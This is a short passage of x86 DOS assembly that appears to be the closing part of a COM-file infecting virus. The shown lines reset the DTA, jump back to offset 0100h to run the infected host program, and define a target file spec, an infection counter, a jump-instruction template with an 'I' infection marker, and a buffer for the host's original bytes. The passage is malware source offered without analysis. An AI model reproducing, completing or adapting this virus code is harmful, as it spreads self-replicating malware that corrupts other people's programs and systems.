re_dta: mov     ah,1ah                  ;Reset DTA
	mov     dx,0080h
	int     21h

	mov     di,0100h                ;Return control to original file!
	push    di
	ret


fspec   db      'z.com',0
infcnt  db      0
jmptbl  db      0e9h,00h,00h,'I'
orgbts: db      90h,90h,90h,90h
